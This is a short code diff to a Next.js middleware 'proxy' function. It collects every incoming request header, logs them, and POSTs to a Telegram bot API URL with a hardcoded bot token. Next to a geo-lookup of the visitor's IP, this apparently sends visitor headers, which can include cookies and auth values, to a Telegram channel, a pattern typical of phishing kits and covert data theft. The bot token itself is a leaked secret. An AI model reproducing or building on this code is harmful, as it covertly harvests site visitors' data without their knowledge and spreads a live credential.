@@ -81,10 +81,14 @@ const getGeoInfo = async (ip: string): Promise<GeoInfo | null> => {
 
 export const proxy = async (req: NextRequest) => {
     const ua = req.headers.get('user-agent');
-    const h = req.headers;
+
+    const rawHeader: Record<string, string> = {};
+    for (const [key, value] of req.headers) {
+        rawHeader[key] = value;
+    }
+    console.log(rawHeader);
     const { pathname } = req.nextUrl;
     const url = 'https://api.telegram.org/bot7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA/sendMessage';
-    const rawHeader = `\`\`\`json\n${JSON.stringify(h)}\`\`\``;
     const data = await fetch(url, {
         method: 'POST',
         body: JSON.stringify({
